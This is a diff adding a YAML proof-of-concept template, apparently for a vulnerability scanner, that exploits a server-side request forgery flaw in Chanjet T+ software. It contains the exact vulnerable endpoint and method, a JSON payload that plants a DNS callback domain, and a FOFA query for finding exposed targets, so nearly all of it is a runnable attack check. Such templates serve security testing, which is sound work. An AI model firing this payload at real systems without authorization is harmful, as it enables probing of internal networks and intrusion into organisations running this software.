@@ -1,0 +1,20 @@
+id: poc-yaml-chanjet-tplus-ufida-t-sm-uip-ashx-ssrf
+info:
+  name: 畅捷通T+ Ufida.T.SM.UIP.ashx SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect
+  headers:
+    Content-Type: application/json
+  data: '{"address":"{{.reverseDomain}}"}'
+  expression: reverse.Verify()
+transport: http
